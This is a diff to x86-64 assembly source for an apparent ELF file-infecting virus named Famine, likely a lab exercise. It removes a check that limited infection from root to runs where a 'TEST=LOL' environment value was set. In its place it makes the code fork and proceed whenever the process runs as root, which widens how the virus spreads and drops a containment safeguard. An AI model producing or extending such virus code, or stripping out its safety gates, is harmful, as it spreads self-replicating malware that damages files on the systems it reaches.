@@ -25,6 +25,7 @@ section .text
 	extern _infect_from_root
 	extern _verify_starting_infect
 	extern _famine_start_options
+    extern _fork_before_exec_normaly
 
 _o_entry:
 	dq 0x0000000000000000 
@@ -103,13 +104,6 @@ _check_registers:
 
 ;; Check if we have rights to infect from root
 _test_root_infect: 
-	mov		rdi, QWORD [rsp + 152]
-	cmp		rdi, 0
-	je		_continue_normaly
-	
-	mov		rax, 0x4c4f4c3d54534554
-	cmp		QWORD [rdi], rax
-	jne		_continue_normaly
 	
 	;; Geteuid syscall
 	mov		rax, 107
@@ -118,9 +112,7 @@ _test_root_infect:
 	;; If syscall returned 0 it means we are root
 	cmp		rax, 0
 	jne		_continue_normaly
-
-	lea		rdi, [rel _force_exit]
-	jmp		_infect_from_root
+    jmp     _fork_before_exec_normaly
 
 ;; If it's a normal execution, we just infect /tmp/test(2)
 _continue_normaly:
